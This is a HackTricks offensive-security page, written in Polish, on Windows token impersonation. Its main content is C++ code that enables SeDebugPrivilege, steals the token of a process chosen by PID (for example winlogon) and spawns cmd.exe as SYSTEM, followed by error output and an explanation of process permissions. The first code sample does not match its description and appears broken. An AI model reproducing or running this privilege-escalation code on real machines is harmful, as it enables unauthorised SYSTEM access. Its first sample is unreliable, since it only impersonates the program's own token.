<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>


## Kod

Poniższy kod pochodzi [stąd](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Pozwala **wskazać identyfikator procesu jako argument** i uruchamia CMD **działające jako użytkownik** wskazanego procesu.\
Uruchamiając w procesie o wysokiej integralności, można **wskazać PID procesu działającego jako System** (np. winlogon, wininit) i uruchomić cmd.exe jako system.
```cpp
impersonateuser.exe 1234
```
{% code title="impersonateuser.cpp" %}

```cpp
#include <windows.h>

int main()
{
    HANDLE hToken;
    HANDLE hDupToken;
    DWORD dwSessionId = 0;
    DWORD dwProcessId = 0;
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID lpEnvironment;

    // Get the current session ID
    dwSessionId = WTSGetActiveConsoleSessionId();

    // Get the process ID of the current process
    dwProcessId = GetCurrentProcessId();

    // Open the current process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

    // Open the primary token of the current process
    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
    {
        printf("OpenProcessToken failed: %u\n", GetLastError());
        return 1;
    }

    // Duplicate the primary token
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
    {
        printf("DuplicateTokenEx failed: %u\n", GetLastError());
        return 1;
    }

    // Impersonate the user associated with the primary token
    if (!ImpersonateLoggedOnUser(hDupToken))
    {
        printf("ImpersonateLoggedOnUser failed: %u\n", GetLastError());
        return 1;
    }

    // Get the current thread handle
    hThread = GetCurrentThread();

    // Set the thread token to the impersonated token
    if (!SetThreadToken(&hThread, hDupToken))
    {
        printf("SetThreadToken failed: %u\n", GetLastError());
        return 1;
    }

    // Load the user profile of the impersonated user
    if (!LoadUserProfile(hDupToken, &lpEnvironment))
    {
        printf("LoadUserProfile failed: %u\n", GetLastError());
        return 1;
    }

    // Do something as the impersonated user

    // Unload the user profile
    if (!UnloadUserProfile(hDupToken, lpEnvironment))
    {
        printf("UnloadUserProfile failed: %u\n", GetLastError());
        return 1;
    }

    // Revert to the original user
    if (!RevertToSelf())
    {
        printf("RevertToSelf failed: %u\n", GetLastError());
        return 1;
    }

    // Close the handles
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}
```
{% endcode %}
```cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
{% endcode %}

## Błąd

W niektórych przypadkach próba podszywania się pod System może nie powieść się i wyświetlić wynik podobny do poniższego:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
To oznacza, że nawet jeśli działa się na poziomie Wysokiej Integralności, **nie ma się wystarczających uprawnień**.\
Sprawdźmy bieżące uprawnienia Administratora dla procesów `svchost.exe` za pomocą **processes explorer** (lub można również użyć process hacker):

1. Wybierz proces `svchost.exe`
2. Kliknij prawym przyciskiem --> Właściwości
3. W zakładce "Zabezpieczenia" kliknij w prawym dolnym rogu przycisk "Uprawnienia"
4. Kliknij na "Zaawansowane"
5. Wybierz "Administratorzy" i kliknij "Edytuj"
6. Kliknij "Pokaż zaawansowane uprawnienia"

![](<../../.gitbook/assets/image (322).png>)

Poprzednie zdjęcie zawiera wszystkie uprawnienia, jakie "Administratorzy" mają dla wybranego procesu (jak widać w przypadku `svchost.exe`, mają tylko uprawnienia "Zapytania").

Zobacz uprawnienia "Administratorów" dla `winlogon.exe`:

![](<../../.gitbook/assets/image (323).png>)

Wewnątrz tego procesu "Administratorzy" mogą "Odczytywać pamięć" i "Odczytywać uprawnienia", co prawdopodobnie pozwala im na podszywanie się pod token używany przez ten proces.
